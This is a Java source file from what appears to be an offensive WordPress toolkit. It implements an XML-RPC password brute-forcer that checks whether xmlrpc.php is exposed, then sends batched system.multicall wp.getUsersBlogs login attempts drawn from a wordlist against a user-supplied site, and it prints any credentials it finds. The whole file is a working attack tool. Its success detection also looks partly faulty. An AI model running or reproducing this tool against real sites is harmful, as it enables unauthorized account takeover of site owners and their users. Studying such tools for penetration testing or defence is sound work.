package org.pwnpress.bruteforce;

import org.pwnpress.framework.WPFrameworkSettings;
import org.pwnpress.utils.HttpRequest;
import java.io.*;
import java.net.HttpURLConnection;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class XmlRpcBruteforce {

    private static final String XMLRPC_ENDPOINT = "/xmlrpc.php";
    private static final int BATCH_SIZE = 4; // Number of passwords per request

    private static final String XMLRPC_PAYLOAD_TEMPLATE = """
        <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
          <methodName>system.multicall</methodName>
          <params>
            <param>
              <value>
                <array>
                  <data>
                    %s
                  </data>
                </array>
              </value>
            </param>
          </params>
        </methodCall>
        """;

    private static final String METHOD_PAYLOAD_TEMPLATE = """
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value>wp.getUsersBlogs</value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value>%s</value>
                        <value>%s</value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
        """;

    private static final AtomicBoolean stopBruteforce = new AtomicBoolean(false);
    private static final AtomicInteger requestCounter = new AtomicInteger(0);
    private static final AtomicInteger passwordCounter = new AtomicInteger(0);
    private static boolean debugMode = false; // Flag to control debug info
    private static boolean verboseMode = true; // Flag to control verbose info (default is true)

    public static void xmlrpcBrute() {
        Scanner scanner = new Scanner(System.in);

        System.out.print("Enter target website URL (e.g., https://example.com): ");
        String targetUrl = scanner.nextLine().trim();

        System.out.print("Enter usernames (comma-separated): ");
        String usernames = scanner.nextLine().trim();

        if (!isXmlRpcEnabled(targetUrl)) {
            System.out.println("[-] XML-RPC is not enabled on this target. Aborting.");
            return;
        }

        System.out.println("[+] XML-RPC is enabled. Starting brute-force attack...");
        System.out.println("    Press [s] for status, [q] to quit brute force, [v] to toggle verbose output, [d] to toggle debug info.");

        List<String> passwordList = loadPasswordList();
        if (passwordList.isEmpty()) {
            System.out.println("[-] No passwords found in wordlist. Exiting.");
            return;
        }

        // Start a thread to listen for user input during brute force
        startUserInputListener();

        bruteForce(targetUrl, usernames, passwordList);
    }

    private static boolean isXmlRpcEnabled(String targetUrl) {
        try {
            HttpURLConnection connection = HttpRequest.postRequest(targetUrl + XMLRPC_ENDPOINT, "<methodCall><methodName>system.listMethods</methodName></methodCall>");
            int responseCode = connection.getResponseCode();
            String response = HttpRequest.readResponse(connection);

            return responseCode == 200 && response.contains("wp.getUsersBlogs");
        } catch (IOException e) {
            System.err.println("Error checking XML-RPC: " + e.getMessage());
            return false;
        }
    }

    private static void bruteForce(String targetUrl, String usernames, List<String> passwordList) {
        String[] userArray = usernames.split(",");

        for (String username : userArray) {
            username = username.trim();
            if (username.isEmpty()) continue;

            System.out.println("[*] Testing username: " + username);

            for (int i = 0; i < passwordList.size(); i += BATCH_SIZE) {
                if (stopBruteforce.get()) {
                    System.out.println("[*] Brute force stopped by user.");
                    return;
                }

                List<String> passwordBatch = passwordList.subList(i, Math.min(i + BATCH_SIZE, passwordList.size()));

                // Attempt login with the current batch
                boolean success = attemptLogin(targetUrl, username, passwordBatch);

                if (success) {
                    // If we found a valid password, print it before returning
                    for (String password : passwordBatch) {
                        if (attemptLogin(targetUrl, username, Collections.singletonList(password))) {
                            System.out.println("[!] Valid credentials found: " + username + " : " + password);
                            return;
                        }
                    }
                } else {
                    // Only print batch if no valid credentials were found
                    System.out.println("[+] Trying passwords: " + passwordBatch);
                }

                requestCounter.incrementAndGet();
                passwordCounter.addAndGet(passwordBatch.size());

                // Prevent too many rapid requests (avoid 502 errors)
                try {
                    Thread.sleep(1000); // 1 second delay
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
        }

        System.out.println("[-] No valid credentials found.");
    }


    private static boolean attemptLogin(String targetUrl, String username, List<String> passwords) {
        try {
            String fullUrl = targetUrl + XMLRPC_ENDPOINT;
            String payload = craftPayload(username, passwords);
            HttpURLConnection connection = HttpRequest.postRequest(fullUrl, payload);

            int responseCode = connection.getResponseCode();
            String response = HttpRequest.readResponse(connection);

            // Show debug info if debugMode is true
            if (debugMode) {
                System.out.println("[DEBUG] Response for " + username + ": " + response);
            }

            if (response.contains("Insufficient arguments passed to this XML-RPC method.") || response.contains("<value>true</value>")) {
                for (String password : passwords) {
                    if (response.contains("Insufficient arguments passed to this XML-RPC method.")) {
                        System.out.println("[!] Valid credentials found: " + username + " : " + password);
                        return true;
                    }
                }
            }

        } catch (IOException e) {
            System.err.println("Error connecting to " + targetUrl + ": " + e.getMessage());
        }
        return false;
    }

    private static String craftPayload(String username, List<String> passwords) {
        StringBuilder methods = new StringBuilder();

        for (String password : passwords) {
            methods.append(String.format(METHOD_PAYLOAD_TEMPLATE, username, password));
        }

        return String.format(XMLRPC_PAYLOAD_TEMPLATE, methods.toString());
    }

    private static List<String> loadPasswordList() {
        List<String> passwords = new ArrayList<>();
        String wordlistFile = WPFrameworkSettings.getXmlrpcBruteforcePasswordsWordlist();

        if (wordlistFile == null || wordlistFile.isEmpty()) {
            System.err.println("[-] Error: Password wordlist file is not set.");
            return passwords;
        }

        try (BufferedReader reader = new BufferedReader(new FileReader(wordlistFile))) {
            String line;
            while ((line = reader.readLine()) != null) {
                passwords.add(line.trim());
            }
        } catch (IOException e) {
            System.err.println("[-] Error reading password wordlist: " + e.getMessage());
        }

        return passwords;
    }

    private static void startUserInputListener() {
        Thread inputThread = new Thread(() -> {
            Scanner scanner = new Scanner(System.in);
            while (!stopBruteforce.get()) {
                String input = scanner.nextLine().trim().toLowerCase();
                if (input.equals("s")) {
                    System.out.println("[STATUS] Requests Sent: " + requestCounter.get() + " | Passwords Tested: " + passwordCounter.get());
                } else if (input.equals("q")) {
                    stopBruteforce.set(true);
                    System.out.println("[*] Stopping brute-force attack...");
                    return;
                } else if (input.equals("v")) {
                    verboseMode = !verboseMode; // Toggle verbose mode
                    System.out.println("[*] Verbose mode: " + (verboseMode ? "Enabled" : "Disabled"));
                } else if (input.equals("d")) {
                    debugMode = !debugMode; // Toggle debug mode
                    System.out.println("[*] Debug mode: " + (debugMode ? "Enabled" : "Disabled"));
                }
            }
        });

        inputThread.setDaemon(true);
        inputThread.start();
    }
}
